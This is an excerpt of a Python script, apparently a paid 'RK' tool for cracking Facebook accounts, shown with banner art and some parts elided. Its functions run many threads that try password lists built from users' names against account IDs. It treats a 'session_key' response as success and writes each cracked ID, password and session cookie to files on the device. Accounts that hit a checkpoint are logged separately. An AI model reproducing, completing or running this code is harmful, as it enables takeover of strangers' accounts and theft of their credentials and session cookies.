...
__________ ____  __.________  ____ 
\______   \    |/ _|\_____  \/_   |
 |       _/      <    _(__  < |   |
 |    |   \    |  \  /       \|   |
 |____|_  /____|__ \/______  /|___|
        \/        \/       \/ 
\033[1;32m  
\033[1;96m        
≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠
\033[1;37m [•] \033[1;37mOwner     :   RAM DON
 [•] Facebook  :   Noot Found
 [•] Github    :   RK-15
 [•] Tool      :   PAID
...
def npxind():
                ...
                with tred(max_workers=30) as RK:     
                        ...
                        for psx in user:
                                ...
                                if mthd in ['1','01']:                                 
                                    RK.submit(rndm1,ids,passlist)
                                if mthd in ['2','02']:    
                                    RK.submit(rndm,ids,passlist)                                	
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def M1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RK-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [RK-OK] '+ids+' | '+pas+'\033[1;97m')                 
                                       # print("\033[1;33m [BISCUT-🍪] :\033[1;33m "+cookie)                                                   
                                        open('/sdcard/RK_m1_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RK_iDs_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                      
                                        oks.append(ids)                           
                                        break                          
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [RK-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/RK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/RKbrand-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
...
def M2(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [RK-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        open('/sdcard/RK_m2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RK_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')                                        
                                        oks.append(ids)                                        
                                        break
